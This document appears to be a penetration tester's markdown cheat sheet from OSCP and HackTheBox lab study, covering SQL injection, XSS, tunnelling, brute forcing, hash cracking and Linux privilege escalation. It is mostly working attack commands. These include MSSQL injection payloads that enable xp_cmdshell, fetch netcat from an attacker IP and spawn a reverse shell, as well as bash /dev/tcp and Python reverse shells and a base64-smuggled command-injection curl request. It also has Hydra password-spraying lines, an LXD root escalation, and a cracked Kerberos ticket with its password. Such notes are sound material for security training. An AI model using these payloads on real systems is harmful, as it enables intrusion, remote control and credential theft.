Whenever we're dealing with **in-band SQL injections** and the result of the query is displayed along with the application-returned value, we should also test for UNION-based SQL injections.

For UNION SQLi attacks to work, we first need to satisfy two conditions:
- The injected UNION query has to include the same number of columns as the original query.
- The data types need to be compatible between each column.

To discover the correct number of columns, we can submit the following injected query into the search bar: `' ORDER BY n-- //` , incramenting the colum value each time so:
- `' ORDER BY 1-- //`
- `' ORDER BY 2-- //`
- `' ORDER BY n-- //`
The above statement orders the results by a specific column, meaning it will fail whenever the selected column does not exist, **so then we know our column amount was the -n succsessful payload**

If we discover it is 5 columns we can then things like `%' UNION SELECT null, database(), user(), @@version,  null -- //` , where: 
-  column 1 is typically reserved for an ID field consisting of an _integer_ data type, which the web application will often ommit, hence whi we shift the enumeration up 1 colums eg `...SELECT null...`
- `%'` will close the search param, so can then begin the `UNION`

To test for Time based blind SQLi our payloads might look like:
- `admin' AND IF (1=1, sleep(5),'false') -- //`

### Time-based blind out-of-band SQL (OSCP Convid) 
1. Determine the Number of Columns in the Query
```
admin' UNION SELECT NULL--             # Causes an error (fewer columns)
admin' UNION SELECT NULL, NULL--       # Valid (correct number of columns)
admin' UNION SELECT NULL, NULL, NULL-- # Causes an error (more columns)
```
2. Determine visible Columns
```
' ORDER BY 1-- // Check first column
' ORDER BY 2-- // Check second column
' ORDER BY 3-- // Causes error (only 2 columns exist)
```

3. Execute a Time based test payload
```
admin' OR 1=1; WAITFOR DELAY '0:0:3'--     # Causes a 3-second delay
```

4. Enable Out-of-band Command execution
```
admin' OR 1=1; EXEC sp_configure 'show advanced options', 1--
admin' OR 1=1; RECONFIGURE--
admin' OR 1=1; EXEC sp_configure 'xp_cmdshell', 1--
admin' OR 1=1; RECONFIGURE--
```

5. Test OOB Command excution

```
# On yor local Linux
sudo tcpdump -i any icmp        

# Use payload in the vuln input like ( might need to uses double quotes on the ping) 
admin'; EXEC xp_cmdshell('ping 192.168.45.195'); --

```

6. Get your tools for reverese shell from your local Server

```
admin' or 1=1; EXEC xp_cmdshell "powershell.exe wget http://192.168.45.195/nc64.exe -OutFile C:\windows\temp\nc64.exe";--
```

7. Reverse the shell to your local Listener ( powershell might prefer 443 ??)

```
admin' or 1=1; EXEC xp_cmdshell "C:\windows\temp\nc64.exe -e cmd.exe 192.168.45.195 443";--
```

8. Find the flag and get teh flag
- `dir C:\flag.txt /s /p /a`
- `type C:\inetpub\wwwroot\flag.txt`
- On bash: `find / -type f -iname "flag.txt" 2>/dev/null`



#### Get all table names in the DBS ( same in MySQL, MSSQL and PostgreSQL):
- `SELECT table_schema, table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE';`

## sqlmap

Although sqlmap is a great tool to automate SQLi attacks, **sqlmap provides next-to-zero stealth. Due to its high volume of traffic, sqlmap should not be used as a first choice tool during assignments that require staying under the radar.**

`sqlmap -r req.txt -p search --os-pwn --batch`  # gets a shell up (--os-pwn) as soon as possible (--batch)
Then, from the `os-shell` prompt call a shell: 
- `bash -c "bash -i >& /dev/tcp/10.10.14.147/4444 0>&1"`

**Alt**

```

sqlmap -r adminReq.txt --risk=3 --level=3 --batch --force-ssl --dbms=postgresql -t 200 --dbs --flush --os-shell
# --flush -  will clear out all the history so yo ucan run it fresh each time

os-shell> bash -c 'bash -i >& /dev/tcp/10.10.14.93/4444 0>&1' # basic reverse shell
``` 

On Mysql ( Linux) if we can find out the webroot and intercept a request: 
`sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"`
Once sqlmap confirms the vulnerability, it prompts us for the language the web application is written in. 

### sqlmap on websockets

```
`sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 -D soccer_db --batch`
Search his site for boolean injection . * will tell sqlmap to test that param
```
## Websockets


#### WS tools 
- **Websocat** 
- **wscat** ( desn't support accepting data from a file)
WebSocat - Can act as a client or a server like curl , nc , socat.

# XSS

## Identifying XSS Vulnerabilities

1. Find potential entry points for XSS by examining a web application and identifying input fields (such as search fields) that accept unsanitised input, which is then displayed as output in subsequent pages.

2. Once we identify an entry point, input `special characters` and observe the output to determine if any of the special characters return unfiltered.

The most common special characters used for this purpose include:

```
<
>
'
"
{
}
;
```
### Two interesting cookie flags for XSS (if they are missing)
`secure` - Only send cookie over encrypted connections eg "https". This protects the cookie from being sent in clear text and captured over the network.
`httpOnly` - Deny javascript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.

### Encode js XSS payloads so bad characters won't interfere
Once you have [MINIFIED_YOUR_JAVASCRIPT](https://jscompress.com/) payload, you can encode it:
```js
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('INSERT_MINIFIED_JAVASCRIPT_HERE')
console.log(encoded)
```

### Funky Proxying 
So we can see the websocket behaviour: When the app makes a call to the target it will go to 127:1 , Burpe will intercept this , and then burp will send it on to the Real product so we can see all the WS traffic.

- Change the target's ip 127.0.0.1
- Create new proxy listener in burp for port 127.0.0.1:5789 (loopback only)
- In the Request handling tab redirect to the original Target IP 10.129.228.216



<details>
	<summary>Websockets Proxy script</summary>

  From HTB - Sockets

```

#!/usr/bin/env python3

# websocket proxy

'''
Will need to update our hosts file, pointing TARGET_URL to localhost , since we will fire up the server target Port locally and then point the remote_url parameter to the target's IP address

So if the target was running on (10.10.11.206) somedomain.xyz:5789 we will use a command to run this script like : 
python3 ws_proxy.py --host 127.0.0.1 --port 5789 --remote_url ws://10.10.11.206:5789
'''

import argparse
import asyncio
import websockets


async def hello(websocket, path):
    '''Called whenever a new connection is made to the server'''

    url = REMOTE_URL + path
    async with websockets.connect(url) as ws:
        taskA = asyncio.create_task(clientToServer(ws, websocket))
        taskB = asyncio.create_task(serverToClient(ws, websocket))

        await taskA
        await taskB


async def clientToServer(ws, websocket):
    async for message in ws:
        print(f"Client -> Server === {message}")
        await websocket.send(message)


async def serverToClient(ws, websocket):
    async for message in websocket:
        print(f"Server -> Client === {message}")
        await ws.send(message)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='websocket proxy.')
    parser.add_argument('--host', help='Host to bind to.',
                        default='localhost')
    parser.add_argument('--port', help='Port to bind to.',
                        default=8765)
    parser.add_argument('--remote_url', help='Remote websocket url',
                        default='ws://localhost:8767')
    args = parser.parse_args()

    REMOTE_URL = args.remote_url

    start_server = websockets.serve(hello, args.host, args.port)

    asyncio.get_event_loop().run_until_complete(start_server)
    asyncio.get_event_loop().run_forever()

```

</details>

 

### Reverse shell for Powershell Linpeas
```sh
python3 -m http.server 80
powershell
wget http://10.10.14.114/winPEASx64.exe -outfile winPEASx64.exe
```



## MySql Cli
```
mysql -h <IP_ADDRESS> -u root --skip-password 
> show databases;
> show tables;
> select * from tables;
> select * from config;
```

---
# Tunneling 

#### Tunnel with SOCAT
On the victim machine to be used as the tunnel run: 
- `socat -ddd TCP-LISTEN:<LISTENING_PORT>,fork TCP:<TARGET_IP>:<TARGET_PORT>`
Then connect via the listening port and it will forward on to the target port.
For example : `socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432`:

#### Tunnel with iptables
If we have root privileges, we could use iptables to create port forwards.
1. Check if IP forwarding is on `1` or off `0`
```
cat /proc/sys/net/ipv4/ip_forward
<n/confluence/bin$ cat /proc/sys/net/ipv4/ip_forward   
0
```
2. Enable it by switching it to `1`. `echo 1 > /proc/sys/net/ipv4/ip_forward`
	1. Or make it persistent between reboots by adding: 
		- `net.ipv4.ip_forward = 1` to the file `/etc/sysctl.conf`
3. Set up `iptables` Rules:
	- Use **PREROUTING** to capture traffic coming in on port `2222` 
	- Then **DNAT (Destination NAT)** it to the internal machine (`10.4.50.215`) on port `22`.

**(PREROUTING) Rule**

```sh
iptables -t nat -A PREROUTING -p tcp --dport <LISTENING_PORT> -j DNAT --to-destination <TARGET_IP>:<TARGET_PORT>
```
Like:
```sh
iptables -t nat -A PREROUTING -p tcp --dport 2345 -j DNAT --to-destination 10.4.162.215:5432
```
- **`-t nat`**: Use the **NAT table**.
- **`-A PREROUTING`**: Append a rule to the PREROUTING chain (this applies to packets as they arrive).
- **`-p tcp --dport 2222`**: Match TCP packets that are destined for port `2222`.
- **`-j DNAT --to-destination 10.4.50.215:22`**: Change the destination address and port of these packets to `10.4.50.215:22`.

**(POSTROUTING) Rule**
```sh
iptables -t nat -A POSTROUTING -p tcp -d <TARGET_IP> --dport <TARGET_PORT> -j MASQUERADE
```
eg:
```sh
iptables -t nat -A POSTROUTING -p tcp -d 10.4.162.215 --dport 5432 -j MASQUERADE
```
Rule explained:
- **`-A POSTROUTING`**: Append a rule to the POSTROUTING chain (this applies to packets as they leave the router).
- **`-d 10.4.50.215 --dport 22`**: Match traffic destined for `10.4.50.215` on port `22`.
- **`-j MASQUERADE`**: This ensures that the outgoing packets have the source IP address of the compromised machine (performing source NAT). This is necessary so the internal machine knows to send response packets back through the compromised machine.

#### Tunnel with Netcat and FIFO
1. Create a named pipe on the compromised machine to handle bidirectional communication
	- `mkfifo /tmp/fifo`
2. Set up two **netcat** instances, 
	 - one to handle the incoming connection from your attacker on port `2222` 
	 - one to connect to the internal target (`10.4.162.215:22`). 
	 The named pipe will serve as the bridge between these two connections.
```sh
# Forward data from the attacker to the internal target 
nc -lvp 2345 < /tmp/fifo | nc 10.4.162.215 5432 > /tmp/fifo
```
**Clean up**: Once you're done, clean up and remove the named pipe:`rm /tmp/fifo`
```sh 
nc -lvp <LISTEN_PORT> < /tmp/fifo | nc <TARGET_IP> <TARGET_PORT> > /tmp/fifo
```
### SSH tunneling
#### Local port forwarding  

```
ssh -N -L <VIC_ALL_IPS>:<LISTEN_PORT>:<FORWARD_IP>:<FORWARD_PORT> UNAME@VICTIM1_IP
ssh -N -L <SETTING:PART> <LOGINPART>
ssh -N -L <LISTENINGSOCKET:FORWARDSOCKET> <LOGINPART>
ssh -N -L 0.0.0.0:4455:172.16.162.217:445 database_admin@10.4.162.215
```
#### Remote port forwarding  

1.  Enable the SSH server on our local machine. 
	1. `sudo systemctl start ssh`
2. Check that the local SSH port is open as we expected using **ss**. 
	1. `sudo ss -ntplu`
3. Once we have a reverse shell from **V1**, and ensure we have a TTY shell, 
	1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
4. Create an SSH remote port forward as part of an SSH connection back to our local machine.	We may have to explicity allow password-based authentication by setting **PasswordAuthentication** to `yes` in `/etc/ssh/sshd_config`.
	1. In this case, we want to listen on port **2345** on our Local machine (**127.0.0.1:2345**), and forward all traffic to the PostgreSQL port on PGDATABASE01 (**10.4.50.215:5432**).
  1. `ssh -N -R LISTEN-SOCKET:TARGET-SOCKET LOCALUSER@localPublicIP`
	2. `ssh -N -R <V1_LOCALCHOST>:2345:<TARGET_ONWARD>:5432 USERNAME@<LOCAL_IP>`
  3. `ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 hacker@192.168.118.4`
	When we authN , again , out terminal will hang . This is normal
5. Confirm that our remote port forward port is listening by checking if port 2345 is open on our local loopback interface: `ss -ntplu`
6. Start Probing the DB we are targeting:
	1. `SOMETOOL -h 127.0.0.1 -p 2345 -U postgres`

#### Remote Dynamic Port Forwarding
From a conquerd host we can send back to started ssh server (`sudo systemctl start ssh`) a connection to a particular port eg `9998` ....
.... `ssh -N -R 9998 hacker@192.168.45.231`
and then once local `proxychains` are configured....
`socks5 127.0.0.1 9998`
.... run commands locally as if we were connected to the victims network over the SOCKS connection.
`proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64`



## chisel ( tunneling tool) 
- https://github.com/jpillora/chisel

Locally: 
- `./chisel server --reverse --port 9002`
Download the windows binariy to the victim and then run
- `.\chisel.exe client 10.10.14.106:9002 R:3308:localhost:3306 R:8888:localhost:8888`
QQ: what does this do? tbc TODO



## ssh 
Forward traffic from the local port 1234 to the remote server remote.example.com 's localhost interface
on port 22 :
```
ssh -L 1234:localhost:22 user@remote.example.com
```
When you run this command, the SSH client will establish a secure connection to the remote SSH server,
and it will **listen** for incoming connections on the **local** port `1234` . 

When a client connects to the **local** port, the SSH client will forward the connection to the **remote** server on port 22 . This allows the **local** client to access services on the remote server as if they were running on the **local** machine. 

In the scenario we are currently facing, we want to forward traffic from any given **local** port, for instance `1234` , to the port on which `PostgreSQL` is listening, namely `5432` , on the **remote** server. 

We therefore specify port `1234` to the left of localhost , and `5432` to the right, indicating the target port.
`ssh -L 1234:localhost:5432 christine@{target_IP}`


----

### Monitor Traffic produced

```
sudo iptables -I INPUT 1 -s 192.168.50.149 -j ACCEPT
sudo iptables -I OUTPUT 1 -d 192.168.50.149 -j ACCEPT
sudo iptables -Z
```
 `sudo iptables -vn -L` Review the **iptables** statistics to get a clearer idea of how much traffic our scan generated. 
- **-v** option to add some verbosity to our output
- **-n** to enable numeric output, 
- **-L** to list the rules present in all chains.


## Ipsec - Pivoting 
(not required) But to block you first list all the rules with `iptables -L`



<details>
	<summary>iptables</summary>

```sh
└─# iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain FORWARD (policy DROP)
target     prot opt source               destination         
DOCKER-USER  all  --  anywhere             anywhere            
DOCKER-ISOLATION-STAGE-1  all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
DOCKER     all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere            

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         

Chain DOCKER (1 references)
target     prot opt source               destination         

Chain DOCKER-ISOLATION-STAGE-1 (1 references)
target     prot opt source               destination         
DOCKER-ISOLATION-STAGE-2  all  --  anywhere             anywhere            
RETURN     all  --  anywhere             anywhere            

Chain DOCKER-ISOLATION-STAGE-2 (1 references)
target     prot opt source               destination         
DROP       all  --  anywhere             anywhere            
RETURN     all  --  anywhere             anywhere            

Chain DOCKER-USER (1 references)
target     prot opt source               destination         
RETURN     all  --  anywhere             anywhere            
```

We then will bloc kwith a command structured like:
- `iptables -A <CHAIN-TO-APPEND-TO> -d <DEST_IP> -j <JUMP-TO-CHAIN>`
- `iptables -A OUTPUT -d 10.10.10.14 -j DROP`

QQ: What does `iptables --flush` do
</details>


open `proxychains.conf` and add a line like `socks4 127.0.0.1 <MSF-SOCKS-PORT>`



## Hosts file 
Browsers only understand how to go to IPs, and if we provide them with a URL, they try to map the URL to an IP by looking into the local /etc/hosts file and the public DNS Domain Name System. If the URL is not in either, it would not know how to connect to it.
- `echo "10.129.136.91 SITE.COM" | sudo tee -a /etc/hosts`

Adding this entry in the /etc/hosts file will enable the browser to resolve the hostname SITE.COM to
the corresponding IP address & thus make the browser include the HTTP header "Host: SITE.COM" in
every HTTP request that the browser sends to this IP address, which will make the server respond with the
webpage for SITE.COM.

This is **"Name-Based Virtual hosting"**, a method for hosting multiple domain names (with separate handling of
each name) on a single server. This allows one server to share its resources, such as memory and processor
cycles, without requiring all the services to be used by the same hostname.
The web server checks the domain name provided in the Host header field of the HTTP request and sends
a response according to that.

### Hosts file on Windows
`C:\Windows\system32\drivers\etc\hosts` is the Windows equivalent to `/etc/hosts` on Linux.

## RFI and LFI
One of the most common files that a penetration tester
might attempt to access on a Windows machine to verify LFI is the hosts file,"WINDOWS\System32\drivers\etc\hosts"



## ftp
Try anon ftp login
```
ftp anonymous@10.129.80.105   # Provide any password
or
ftp <IP_ADDR> # same

ftp> ls -l
ftp> binary
ftp> get filename 
ftp> mget *      # Will download everything 
ftp> bye
See the file in the local dir
```

If you get issues like ...
```
ftp> ls -la
229 Entering Extended Passive Mode (|||61560|)
```
`ftp> passive` - Toggles passive mode on/off

IF annonymous get all files with wget
- `wget -r ftp://<IPADDRESS>`


```
ftp -A 192.168.xxx.53    # Enable an active session
ftp> put putty.exe       # Uploada file
ftp> bin                 # enable binary mode, is used for transferring binariers , executables etc, byte-for-byte transfer

```

## Telnet 

```sh
telnet <IPADDRES> <PORT>   # often the port is 23 or 25
HELO <ANY_OLD_DOMAIN>      # doesnat have to be real
250 OK			               # this means we are in
RCPT TO: <VALID_USER>      # this should be a valid email to the server in angle brackets
250 OK
RCPT TO: <INVALID_USER>     
550 unknown user                  # We can use this to bruteforece usernames
MAIL FROM: someoneunkonw@mail.com # if its a domain outside of the server it will accept it becasue it cannot verify them locally so has to trust.
250 OK
```

## Make a password list with Crunch
`crunch 6 6 -t Lab%%% > wordlist`
- minimum and maximum length to 6 characters, 
- **-t** parameter, and set the first three characters to **Lab** followed by three numeric digits.

## Hydra

Supported services: `adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp`

Brute force a login for user `george` 
- `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201`
Password spray on a list of users via ssh ( See htb Funnel) 
`hydra -L usernames.txt -p 'funnel123#!#' {target_IP} ssh`
Try on **rdp**
- ``hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202`
Basic Auth 
- `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.242.201 http-get -I`

#### HTTP POST Login Form

1. Capture the request in burp
2. Set up hydra for a `http` or `https` request with the **http[s]-post-form** argulat whith accepts three colon-delimited fields:
The first field indicates the location of the login form. In this demonstration, the login form is located on the **index.php** web page. The second field specifies the request body used for providing a username and password to the login form, which we retrieved with Burp. Finally we must provide the failed login identifier, also known as a _condition string_.
- `hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "LOCATION-OF-LOGIN:REQUEST-BODY-PARAM-FOR-LOGIN-:CONDITION-STRING"`
- `hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"`

**Understand that** the condition string is searched for within the response of the web application to determine if a login is successful or not. To reduce false positives, we should always try to avoid keywords such as password or username. To do so, we can shorten the condition string appropriately.


## Hash Cracking Methodology
We can describe the process of cracking a hash with the following steps:
1. **Extract hashes** - dump the database table
2. **Format/Identify hashes** - `hashid` or `hash-identifier`
3. **Calculate the cracking time** - Is it worth it? 
4. **Prepare wordlist** 
5. **Attack the hash** - Take special care when Copying /pasting

1 (Kali Tools, 2022), https://www.kali.org/tools/hash-identifier/ ↩︎
2 (Kali Tools, 2022), https://www.kali.org/tools/hashid/ ↩︎


## hashid
Install with `pip3 install hashid`
then run a command like `hashid e7816e9a10590b1e33b87ec2fa65e6cd` or 
`hashid hashInAFile.txt`

Output suggestions like:
```sh
┌──(root㉿kali)-[~]
└─# hashid e7816e9a10590b1e33b87ec2fa65e6cd
Analyzing 'e7816e9a10590b1e33b87ec2fa65e6cd'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
```

## John the Ripper
```
zip2john LOCKEDFILE.zip > UNLOCKED.hash
john --wordlist=/usr/share/wordlists/rockyou.txt UNLOCKED.hash
```
## HashCat - basics
!!! Be Carefull when transporting hashes around eg COPYING/PASTING etc. They might become unworkabkle.
!!! Sometimes hashcat is fussy about the format and might reject the hash. Although powerful , `john` might be a better choice: `john --wordlist=rockyou.txt msql.hash`

```
# put hash in quotes to preserver the special chars
hashcat -m 3200 -a 0 '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' /usr/share/wordlists/rockyou.txt -o OUTPUT-hash.txt

echo '<SOMEHASHVALUE_EG_MD5' > hash.txt
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```
- `-o <OUTPUT-FILE>.txt` is the output file which could come in handy lateron
```sh
hashcat -a 0 -m 0 hashInAFile.txt /usr/share/seclists/Passwords/Leaked-Databases/md5decryptor-uk.txt -r /usr/share/hashcat/rules/best64.rule
```

#### HashCat Rules
- `hashcat -m 0 HASH-FILE.txt <WORDLIST> -r <RULEFILE> --force`
- `hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force`
Hashcat includes a variety of effective rules in `/usr/share/hashcat/rules:`

Search for KeePass hashing mode in the docs :
- `hashcat --help | grep -i "KeePass"`
Try Cracking a keepass hash with the rule rockyou3000 set 
- `hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force`
The 64 best effective rules.
- `hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

#### Create password lists
Created a small relavent passsoerd list and then mutated/expanded the list with hashcat
- `hashcat --force somepasswords.txt -r /usr/share/hashcat/rules/best64.rule --stdout > NewPW.txt`

#### Attack modes 
```sh
- [ Attack Modes ] -
  # | Mode
 ===+======
  0 | Straight
  1 | Combination
  3 | Brute-force
  6 | Hybrid Wordlist + Mask
  7 | Hybrid Mask + Wordlist
  9 | Association
```

#### Cracking modes
[We can search here for different hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) ( ( example colum) and there respecive modes for the tool ( first colum) eg below mode `13100` == `Kerberos 5`
```
hashcat -m 13100 thehash /usr/share/wordlists/rockyou.txt -o cracked.txt
```

<details>
	<summary>example output</summary>

```sh
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-Intel(R) Core(TM) i9-10900 CPU @ 2.80GHz, 18692/37448 MB (8192 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$f25b8a3e219ba5f26b7277bb4227801a$a92862c77f7092ee09821647480c71d5808dbb547bf12a8338bb6151397803065254368d1e39b161cc60751ba31fe2e226f118376dde3524571f0ef85a85d02b0119e89bc434a88e14999e52ef6c7dada16a5a5cab78d5c09cf261a10bc5776d87da1080e9e283c48dfea44db4c4f20dfb11e9718dd8d0ca5114bca86bbca128f9e8aaf644ea6f3a3561000e031886aa77ff83df73a688f216c8ac854ad0ca025c8a262d0a0087e8a689898ba2bae498ba2c25a16698ac7e18eecf615a7e3e6d152566b5299583ae8dece03a5850d7d0afb48ecbf19aa49778de94cedcce04d512e5ff4fb79ec61e8f18e08e7abc2ae900167e090e7569895120df8f225b52dc9b4153d4361691ff0dacb8356d7d68d273181421c3af3cb2feae8b42778d1fe17e83f04e62beb7db16c407b846d8d45ab53939ce18d83ec7cbc54c433e3983495adb719781002e11d1c67e4a0814b4397b4e588ac3d04b399792331d599bec60b702810fbbe0f2b84b8ac5c1255206faa506133e03750fd94b097c1693668877d781190db08a97f1acb6f42947a6e1f49321cea8c23199dc7c4f8d77ce1b197623e8cdd5a289f4efd6746a9049a1d794c3da2827cb2abac13d89d725fb80ac8b6a7a270c3391cad606725240f8a149f26092c77b947833d6973f47ad5d3b7958a998acbfd3bbaca000fdf7dcfe62fa9a45ec0229e98e96aa3365fe3c17dd27cc7bde9f8deebf8cf546d0ebeaec73e5cdd27c078fb72042a4084dc7f17e56e1e6bef0f08ff5cf4709e04fd3fc088204dcdc9017b6e0c25e14c997f4d3fec0de9b3a141930ff54092cff71a0f94caba2ed365f01ad88987adea197f2fa3917d2e2da797c2d9e272518801c4c7dfc1a8683e872ed4df5c126d04702dbc77a942f9e7cc7807320b1dcd444ce47a1444a874e110c302f6511726a26ed361caabe8a0b347f61714b9c4bd895eebd52ddbe2e8598853778f864b7e06810a74017df08047592ed0ac60a7cfe3481d979499491f56fd11401b561fd691cc9c9a6b5bcc90728ee193c785d8642d9c6d62554abbda609c0c9b7776a341dbcfa7e9c781c454dacab5324c513799db8aaf5433a6b7f0b52ab6c5f30251cd4ad9b7d676b87d5da919d328e6bc26f89d9782e32cacad66b1b1ede8927f32a12ea21d857855f1d0df5780f857c97bba3439c73542f9c5f98ed7b17ebd94bb272fb9af8f118d998067556912dd0b9ae819626fc0723d978ded2e7628eca7f941e40f3:Ticketmaster1968
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...1e40f3
Time.Started.....: Fri Jan 12 15:55:30 2024 (7 secs)
Time.Estimated...: Fri Jan 12 15:55:37 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1514.4 kH/s (1.87ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10539008/14344385 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tioncurtis23 -> Thelittlemermaid
Hardware.Mon.#1..: Util: 56%

Started: Fri Jan 12 15:55:15 2024
Stopped: Fri Jan 12 15:55:39 2024
```

</details>

## Password Manager Vault File Types
- **KeePass** - `.kdbx`
- **LastPass** - `.lpvault`
- **1Password** - `.opvault`
- **Dashlane** - `.dash`
- **Bitwarden** - `.json` (export format)
- **Password Safe** - `.psafe3`
- **RoboForm** - `.rfo`
- **Enpass** - `.walletx`
- **NordPass** - `.npvault`



## Databases
sqlite browser tool: https://sqlitebrowser.org/ can load database files and see the contens in a gui
# Linux 

Search for a particualr tool `<sudo apt-cache search <TERM>` 

#### Secureing Crul payloads with encodeing

1. Create a b64 payload for the username id param:
- `echo -n 'bash -i  >& /dev/tcp/10.10.14.100/9001 0>&'|base64 -w0`
1. curl the endpoint with the payload and a decode
```
curl http://10.129.229.26:55555/at4fwy1/ --data 'username=;`echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTAwLzkwMDEgMD4mMQ== | base64 -d | bash`'
```
This method protects the payload from any special chars getting extracted


```
bash -i >& /dev/tcp/10.10.16.2/9001 0>&1`

echo 'import socket,os,pty;' >> script3.py 
echo 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);' >> script3.py 
echo 's.connect(("10.10.16.2",4242));' >> script3.py 
echo 'os.dup2(s.fileno(),0);' >> script3.py 
echo 'os.dup2(s.fileno(),1);' >> script3.py 
echo 'os.dup2(s.fileno(),2);' >> script3.py 
echo 'pty.spawn("/bin/sh")' >> script3.py 
```

## Compgen -c 
List all the permissions of each compgen binary and then use this to compare to GTFObins
`compgen -c | sort -u | while read cmd; do which $cmd &>/dev/null && ls -la $(which $cmd); done`
### Linux Version

The following commands can all find os name and version in Linux:
```
cat /etc/os-release
lsb_release -a
hostnamectl
```
# Find Linux kernel version
```
uname -r 
```
`usermod -aG sudo <USERNAME>  # add <USERNAME> to the sudoers group` 

## LXD
LXD is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the local lxd group. It does not make an effort to
match the permissions of the calling user to the function it is asked to perform.

To Read - https://www.hackingarticles.in/lxd-privilege-escalation/
`Linux Container (LXC)` are often considered as a lightweight virtualization technology that is something in the middle between a chroot and a completely developed virtual machine, which creates an environment as close as possible to a Linux installation but without the need for a separate kernel.
`Linux daemon (LXD)` is the lightervisor, or lightweight container hypervisor. LXD is building on top of a container technology called LXC which was used by Docker before. It uses the stable LXC API to do all the container management behind the scene, adding the REST API on top and providing a much simpler, more consistent user experience.

```
apt install lxd
apt install zfsutils-linux
usermod --append --groups lxd Bob
lxd init
lxc launch ubuntu:18.04
lxc list
```

### LXD Privesc (HTB Identified)
```
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
lxc init myimageNasty ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
```

### TFTP
Trivial File Transfer Protocol (TFTP) is a simple protocol that provides basic file transfer function with no user authentication. 
TFTP is intended for applications that do not need the sophisticated interactions that File Transfer Protocol (FTP) provides.  
